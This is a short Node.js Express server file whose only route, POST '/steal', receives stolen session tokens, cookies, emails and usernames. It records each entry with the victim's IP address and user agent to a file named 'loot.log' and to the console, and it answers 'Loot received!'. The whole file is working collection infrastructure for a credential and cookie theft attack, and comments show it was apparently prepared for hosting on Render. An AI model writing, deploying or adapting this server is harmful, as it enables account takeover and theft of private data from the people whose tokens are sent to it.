// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();

// Parse JSON bodies
app.use(express.json());

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');
const logStream = fs.createWriteStream(LOG_FILE, { flags: 'a' });

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    
    // 1. Write to local file
    logStream.write(line);
    
    // 2. Print to Console (This shows up in Render Dashboard Logs)
    console.log(line); 
}

// --- Routes ---
app.post('/steal', (req, res) => {
    const { token, cookie, email, username } = req.body;

    // Validate input
    if (!token && !cookie) {
        return res.status(400).json({ error: 'Missing token or cookie' });
    }

    // Log securely
    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        email: email,
        username: username,
        ip: req.ip,
        userAgent: req.get('User-Agent')
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Start HTTP server (Simpler and works on all Render plans)
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
